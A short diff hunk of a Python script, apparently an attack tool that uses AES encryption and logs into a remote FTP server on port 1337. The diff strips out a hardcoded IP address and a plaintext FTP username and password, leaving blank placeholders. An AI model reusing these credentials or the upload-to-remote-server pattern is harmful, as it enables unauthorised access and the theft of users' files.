@@ -7,13 +7,13 @@ from Crypto.Cipher import AES
 temp = tempfile.mkdtemp()
 nombre = os.getlogin()
 
-host = "72.167.38.255"
+host =
 port = 1337
 
-ftp_user = "arcadia"
-ftp_pass = "Watchdogs12@"
+ftp_user = 
+ftp_pass = 
 
-ftp = FTP("72.167.38.255")
+ftp = FTP()
 ftp.login(ftp_user, ftp_pass)
 
 def carpeta():
